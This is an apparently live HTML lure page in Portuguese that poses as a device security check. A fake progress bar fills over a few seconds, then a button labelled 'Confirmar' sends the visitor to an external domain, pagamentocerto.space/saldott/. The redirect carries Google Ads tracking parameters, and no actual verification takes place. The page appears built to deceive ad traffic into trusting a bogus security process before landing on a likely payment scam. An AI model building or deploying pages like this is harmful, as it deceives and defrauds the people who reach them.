     <!DOCTYPE html>
     <html>
     <head>
         <meta charset="UTF-8">
         <meta name="viewport" content="width=device-width, initial-scale=1.0">
         <title>Verificação de Segurança</title>
         <style>
             body { margin:0; font-family:-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: linear-gradient(180deg, #E8F4FD 0%, #D4E8FB 60%, #B5D6F5 100%); }
             .container { text-align:center; padding:200px 20px; background: rgba(255,255,255,0.9); box-shadow: 0 20px 50px rgba(12,50,111,0.15); border-radius: 24px; margin: 40px auto; max-width: 520px; }
             .bar { width:0%; background:#4CAF50; height:10px; border-radius:5px; transition:width 0.5s ease-in-out; margin:50px auto; max-width:400px; }
             h1 { color:#2c3e50; }
             .fake-button {
                 background: linear-gradient(180deg, #1351B4 0%, #0F4DA8 100%);
                 color: #E8F4FD;
                 border: none;
                 padding: 12px 30px;
                 border-radius: 5px;
                 cursor: pointer;
                 margin-top: 20px;
                 transition: background 0.2s ease, opacity 0.2s ease;
             }
             .fake-button:hover:not(:disabled) {
                 background: #0F4DA8;
             }
             .fake-button:disabled {
                 background: #0C326F;
                 opacity: 0.8;
                 cursor: not-allowed;
             }
         </style>
     </head>
     <body>
         <div class="container">
             <h1>Verificando Segurança do Seu Dispositivo</h1>
             <div class="bar" id="bar"></div>
             <p>Processo: <span id="status">Inicializando...</span></p>
             <button id="confirmButton" class="fake-button" onclick="skip()" disabled>Revalidar Dados Instantaneamente</button>
         </div>
        <script>
            // Progresso visual
            let progress = 0;
            const button = document.getElementById("confirmButton");
            button.disabled = true;
            const interval = setInterval(() => {
                progress += 5;
                document.getElementById("bar").style.width = `${progress}%`;
                document.getElementById("status").innerText = `${progress}% concluído`;
                if (progress >= 100) {
                    clearInterval(interval);
                    document.getElementById("status").innerText = "100% concluído. Clique no botão para continuar.";
                    button.textContent = "Confirmar";
                    button.disabled = false;
                }
            }, 200);

            // Constrói URL de redirect adicionando UTM ou preservando gclid/UTMs existentes.
            function getUTMDefaults() {
                const defaults = {
                    utm_source: "google",
                    utm_campaign: "{campaignid}",
                    utm_medium: "{adgroupid}",
                    utm_content: "{creative}",
                    utm_term: "{placement}::{keyword}",
                    keyword: "{keyword}",
                    device: "{device}",
                    network: "{network}"
                };
                return Object.assign({}, defaults, window.UTM_OVERRIDES || {});
            }

            function buildRedirectUrl(base) {
                try {
                    const baseObj = new URL(base);
                    const targetParams = new URLSearchParams(baseObj.search);
                    const srcParams = new URLSearchParams(window.location.search);

                    // Preserve gclid se presente na URL de origem
                    if (srcParams.has('gclid') && !targetParams.has('gclid')) {
                        targetParams.set('gclid', srcParams.get('gclid'));
                    }

                    const defaults = getUTMDefaults();
                    const utmKeys = ['utm_source','utm_medium','utm_campaign','utm_content','utm_term','keyword','device','network'];

                    utmKeys.forEach(key => {
                        if (!targetParams.has(key)) {
                            if (srcParams.has(key)) {
                                targetParams.set(key, srcParams.get(key));
                            } else if (defaults[key]) {
                                targetParams.set(key, defaults[key]);
                            }
                        }
                    });

                    // Mapeamentos comuns do Google Ads (se estiverem presentes)
                    if (!targetParams.has('utm_term') && srcParams.has('keyword')) {
                        targetParams.set('utm_term', srcParams.get('keyword'));
                    }
                    if (!targetParams.has('utm_content') && srcParams.has('adcontent')) {
                        targetParams.set('utm_content', srcParams.get('adcontent'));
                    }

                    baseObj.search = targetParams.toString();
                    return baseObj.toString();
                } catch (e) {
                    return base; // fallback
                }
            }

            function skip() {
                clearInterval(interval);
                window.location.href = buildRedirectUrl("https://pagamentocerto.space/saldott/");
            }
        </script>
     </body>
     </html>
